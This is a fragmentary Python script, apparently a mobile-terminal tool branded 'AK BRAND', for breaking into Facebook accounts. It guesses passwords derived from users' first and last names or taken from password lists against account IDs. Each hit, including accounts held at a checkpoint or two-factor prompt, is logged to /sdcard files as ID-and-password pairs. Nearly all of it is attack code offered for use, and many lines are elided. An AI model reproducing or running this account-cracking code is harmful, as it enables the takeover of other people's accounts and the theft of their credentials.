...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; AK \x07')
...
logo ="""     \033[1;37m____ \033[1;32m                           \033[1;37m____   
    ...
    \033[1;37m█─███▀██─██▀█─██─██─█▄▀─███─▄█▀██─▄─▄█
    \033[1;37m▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀ 
    \033[1;37m                            CODED BY:AK BRAND 
    
\033[1;37m╔\033[1;36m[1;37m========═══════════════\033[1;36m✯𝐀k\033[1;37m═══════════════════════════════\033[1;36m\033[1;37m╗
\033[1;31m│\033[1;37m☞ \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mAK BRAND        \033[1;31m│
\033[1;31m│\033[1;37m☞ \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mAk BRAND        \033[1;31m│
\033[1;31m│\033[1;37m☞ \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m 00AkBrand      \033[1;31m │
...
\033[1;37m╚\033[1;36m \033[1;37m══════\033[41m\033[1;37m[ AK BRAND ]\x1b[0m═════════════════════════════\033[1;36mAk\033[1;37m╝
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/Ak-81.txt')
...
def file_crack():
    ...
    try:
        ...
        print("FOR EXAMPLE (firstlast, First Last, first123, first last,first@123,first@@@,first123@,Last@@,Last@123)")
        print("")
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/Ak_OK.txt\n[•] CP IDS SAVE : /sdcard/Ak_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[Ak🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[Ak🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    ok.append(cid)
                    open('/sdcard/Ak_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        ...
                        tf.append(cid)
                        open('/sdcard/Ak_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            cp.append(cid)
                            open('/sdcard/Ak_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Ak-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Ak-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Ak-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/Ak-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    ...
                    open('/sdcard/Ak-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Ak 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
